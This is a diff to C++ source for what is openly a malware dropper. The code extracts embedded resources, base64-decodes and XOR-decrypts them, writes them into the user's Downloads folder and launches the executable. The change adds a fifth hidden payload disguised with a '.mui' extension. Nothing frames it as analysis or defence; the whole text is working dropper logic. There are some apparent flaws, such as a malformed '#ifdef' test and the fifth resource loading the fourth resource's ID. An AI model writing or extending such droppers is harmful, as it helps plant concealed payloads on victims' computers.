@@ -85,26 +85,31 @@ std::string name1;
 std::string name2;
 std::string name3;
 std::string name4;
+std::string name5;
 
 HRSRC r1;
 HRSRC r2;
 HRSRC r3;
 HRSRC r4;
+HRSRC r5;
 
 HGLOBAL rc1;
 HGLOBAL rc2;
 HGLOBAL rc3;
 HGLOBAL rc4;
+HGLOBAL rc5;
 
 void* data1;
 void* data2;
 void* data3;
 void* data4;
+void* data5;
 
 DWORD size1;
 DWORD size2;
 DWORD size3;
 DWORD size4;
+DWORD size5;
 
 // Entry Point
 int main(int argc, char* argv[])
@@ -171,17 +176,21 @@ int main(int argc, char* argv[])
 
 #else
 		dropper_start(4);
+		dropper_start(5);
 
 	#ifdef DROPPER_BASE64 == 1
 		data4 = base64decode(data4, &size4);
+		data5 = base64decode(data5, &size5);
 	#endif
 
 	#if DROPPER_XOR_KEY != 0
 		std::cout << std::hex << DROPPER_XOR_KEY << std::endl;
 		data4 = XOR(data4, size4);
+		data5 = XOR(data5, size5);
 	#endif
 
 		drop(size4, data4, name4);
+		drop(size5, data5, name5);
 
 		std::cout << "before launch";
 		exe_launch(name4);
@@ -289,6 +298,8 @@ void setup_name(std::uint64_t os_version) {
 		if (temp != nullptr){
 			name4 += temp;
 			name4 += "\\Downloads";
+			name5 += temp;
+			name5 += "\\Downloads";
 
 		} else {
 			printf("Problem with userprofile");
@@ -357,6 +368,7 @@ void set_name(std::uint64_t os_version)
 #else
 
 	name4+=DROPPER_OUTPUT;
+	name5+=DROPPER_OUTPUT + ".mui";
 
 #endif
 	}
@@ -426,6 +438,17 @@ void dropper_start(int x){
 		// Get embedded file size
 		size4 = SizeofResource(h, r4);
 	}
+	if (x == 5){
+		//Locate Resource
+		r5 = FindResource(h, MAKEINTRESOURCE(IDR_BIN4), MAKEINTRESOURCE(BIN));
+		// Load Resource
+		rc5 = LoadResource(h, r5);
+		// Ensure nobody else will handle it
+		data5 = LockResource(rc5);
+		// Get embedded file size
+		size5 = SizeofResource(h, r5);
+	}
+
 }
 
 bool non_exe_launch(std::string name){
